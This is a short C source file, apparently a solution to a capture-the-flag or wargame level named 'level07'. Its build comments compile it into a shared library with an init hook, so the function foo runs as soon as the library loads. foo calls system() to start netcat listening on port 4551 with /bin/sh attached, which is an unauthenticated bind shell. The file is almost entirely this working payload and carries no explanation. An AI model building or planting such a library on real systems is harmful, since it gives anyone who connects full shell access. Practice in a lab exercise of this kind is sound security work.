/*
gcc -c -Wall -Werror -fpic level07.c -Wl,-init,foo
gcc -shared -o level07.so level07.o -Wl,-init,foo
*/
#include <stdio.h>
#include <stdlib.h>
 
void foo(void)
{
    system("/bin/nc.traditional -l -p4551 -e /bin/sh");
}

